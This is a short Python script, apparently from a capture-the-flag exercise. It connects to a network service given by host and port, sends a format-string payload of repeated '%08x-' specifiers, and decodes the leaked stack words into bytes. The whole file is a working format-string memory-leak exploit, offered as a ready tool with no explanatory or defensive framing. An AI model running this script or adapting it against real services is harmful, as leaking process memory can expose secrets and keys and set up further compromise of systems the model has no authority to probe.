#!/usr/bin/env python3

import struct
import argparse
import socket
import binascii


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-H", "--host", help="Host of the service", type=str, required=True)
    parser.add_argument("-p", "--port", help="Port of the service", type=str, required=True)
    args = parser.parse_args()
    mysocket = socket.socket()
    mysocket.connect((args.host, int(args.port)))
    data = mysocket.recv(1024).decode()
    print (data)
    message = "%08x-" * 40 + "\n"
    mysocket.sendall(message.encode("utf8"))
    data = mysocket.recv(1024).decode()
    print (data)
    data = data[20:]
    data = data[:270]
    data = data.split("-")
    result = []
    for addr in data:
        addr = struct.pack("<I", int(addr, 16))
        print (addr)
        addr = binascii.unhexlify("".join("%02x" % b for b in addr))
        print (addr)
        result.append(addr)
    print (result)


if __name__ == "__main__":
    main()